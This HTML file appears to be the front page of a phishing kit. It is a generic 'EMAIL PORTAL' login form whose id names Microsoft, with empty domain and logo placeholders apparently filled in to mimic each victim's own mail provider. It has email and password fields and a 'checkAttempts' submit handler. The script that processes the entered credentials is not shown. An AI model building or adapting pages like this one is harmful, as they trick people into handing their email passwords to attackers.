<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EMAIL PORTAL</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <form id="microsoft-login-form">
            <h2>EMAIL PORTAL</h2>
            <span id="domainPlaceholder"></span> <!-- Placeholder for domain -->
            <div class="xlogo">
                <img id="zion" src="https://www.google.com/s2/favicons?domain=">
                <span style="text-transform: lowercase;" class="text-g" id="banNer"></span>
            </div>
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Your email">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Your password">
            </div>
            <div id="error-message" style="color: red;"></div><br>

            <button type="submit" onclick="checkAttempts()">Login</button>
            <p id="loginMessage"></p> <!-- Placeholder for login message -->
        </form>
    </div>
    <script src="script.js"></script>
</body>
</html>
